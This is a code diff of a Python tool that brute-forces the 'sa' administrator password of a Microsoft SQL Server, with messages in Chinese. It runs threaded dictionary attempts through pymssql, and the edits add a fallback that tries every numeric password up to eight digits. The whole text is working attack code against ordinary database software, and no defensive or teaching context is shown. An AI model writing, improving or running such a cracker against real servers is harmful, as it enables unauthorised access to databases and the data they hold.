@@ -21,7 +21,7 @@ def cracker(server,pswd_list,no):
         if not tag:
             try:
                 conn=pymssql.connect(server,'sa',str(pswd),database='master')
-                print(u"No.%s号线程运行结束 !\n 服务器%s 账号sa的密码为 ：  %s" % (no,server,pswd))
+                print(u"No.%s号线程运行结束 !\n 服务器%s 账号sa的密码为 ：  %s\n" % (no,server,pswd))
                 tag = True
                 break
             except:
@@ -29,7 +29,7 @@ def cracker(server,pswd_list,no):
         else:
             break
     
-    print(u"No.%s号线程运行结束 !" % no)
+    #print(u"No.%s号线程运行结束 !" % no)
         
     
 def get_pwlist():
@@ -44,19 +44,21 @@ def main():
     global tag
     tag = False
     server = '127.0.0.1'
-    num_thread = 5
+    num_thread = 10
     time_start = time.time()
     pwlist = get_pwlist()
     step = len(pwlist)//num_thread+1
     for n in range(num_thread):
         t1 = Thread(target = cracker,args = (server,pwlist[step*n:step*n+step],str(n+1),))
         t1.start()
-    for m in range(10):
-        t2 = Thread(target = cracker,args = (server,range(m*10000000,(m+1)*10000000),str(m+1)+'+',))
-        t2.start()
-    
     t1.join()
-    t2.join()
+    
+    if not tag:
+        print(u'密码字典测试完毕，未找到匹配密码，将遍历测试8位以内所有数字密码！')
+        for m in range(10):
+            t2 = Thread(target = cracker,args = (server,range(m*10000000,(m+1)*10000000),str(m+1)+'+',))
+            t2.start()
+        t2.join()
     time_end = time.time()
     time_use = time_end - time_start
     print(u'用时 %d时%d分%d秒' % (time_use//3600,time_use%3600//60,time_use%60))
